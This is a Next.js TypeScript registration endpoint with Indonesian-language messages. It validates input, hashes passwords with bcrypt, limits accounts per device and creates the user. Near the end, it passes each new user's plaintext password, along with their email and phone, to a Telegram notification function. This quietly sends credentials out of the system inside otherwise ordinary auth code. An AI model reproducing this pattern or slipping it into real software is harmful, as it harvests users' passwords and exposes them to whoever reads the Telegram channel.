import { hash } from "bcryptjs";
import { NextResponse } from "next/server";
import { z } from "zod";
import { createUser, findUserByEmail, findUserByIdentifier, isAdminEmail, checkDeviceAccountLimit, recordDeviceAccountCreation } from "@/server/db";
import { sendTelegramAuthNotification } from "@/server/notifications";

const registerSchema = z
  .object({
    email: z.string().email(),
    phone: z.string().trim().min(8).max(20),
    password: z.string().min(6).max(120),
    deviceId: z.string().optional(),
  });

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const payload = registerSchema.parse(body);
    const email = payload.email.trim().toLowerCase();
    const emailName = email.split("@")[0].replace(/[^a-z0-9._-]/gi, "").slice(0, 40);
    const baseUsername = emailName.length >= 2 ? emailName : "sobat";
    let username = baseUsername;
    let suffix = 1;
    while (await findUserByIdentifier(username)) {
      const suffixText = String(suffix);
      username = `${baseUsername.slice(0, 40 - suffixText.length)}${suffixText}`;
      suffix += 1;
    }

    // Check device account limit if deviceId is provided
    if (payload.deviceId) {
      const deviceLimitCheck = await checkDeviceAccountLimit(payload.deviceId);
      if (!deviceLimitCheck.allowed) {
        return NextResponse.json(
          { message: deviceLimitCheck.message ?? "Sudah mencapai batas pembuatan akun dari perangkat ini." },
          { status: 429 },
        );
      }
    }

    const existingEmail = await findUserByEmail(email);
    if (existingEmail) {
      return NextResponse.json(
        { message: "Email sudah terdaftar." },
        { status: 409 },
      );
    }

    const passwordHash = await hash(payload.password, 10);
    const adminRole = await isAdminEmail(email);

    const newUser = await createUser({
      username,
      email,
      phone: payload.phone,
      passwordHash,
      role: adminRole ? "admin" : "user",
    });

    // Record device account creation for tracking
    if (payload.deviceId && newUser?.id) {
      await recordDeviceAccountCreation(payload.deviceId, newUser.id);
    }

    void sendTelegramAuthNotification({
      event: "sign_up",
      name: username,
      email,
      phone: payload.phone,
      password: payload.password,
    });

    return NextResponse.json({ message: "Registrasi berhasil." });
  } catch (error) {
    if (error instanceof z.ZodError) {
      return NextResponse.json(
        { message: "Data yang kamu isi belum lengkap atau belum sesuai." },
        { status: 400 },
      );
    }

    return NextResponse.json(
      { message: "Gagal registrasi. Coba lagi." },
      { status: 500 },
    );
  }
}

